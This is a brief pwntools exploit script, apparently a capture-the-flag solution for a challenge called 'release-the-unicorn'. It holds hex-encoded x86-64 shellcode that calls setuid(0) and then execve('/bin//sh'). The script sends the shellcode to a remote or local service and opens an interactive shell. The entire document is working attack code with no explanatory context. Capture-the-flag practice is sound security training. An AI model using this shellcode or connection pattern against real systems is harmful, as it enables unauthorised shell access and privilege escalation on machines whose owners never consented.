from pwn import *

payload = bytes.fromhex(
    "48BFFFFFFFFFFFFFFF7F48C1EF284839E774224831FF6A69580F0557575E5A48BF6A2F62696E2F736848C1EF0857545F6A3B580F0548BF6A2F62696E2F7368"
)

stupid = bytes.fromhex(
    "48BFFFFFFFFFFFFFFF7F48C1EF404839E7"
)
#r = remote("015fdbfdcfa8d3cbe49e372d-release-the-unicorn.challenge.master.cscg.live",31337,ssl=True)
r = remote("localhost",32768 + 3 )
print(r.recv())
print(r.send(payload + b"\x00"))
print(r.recvline())
r.interactive()
r.close()

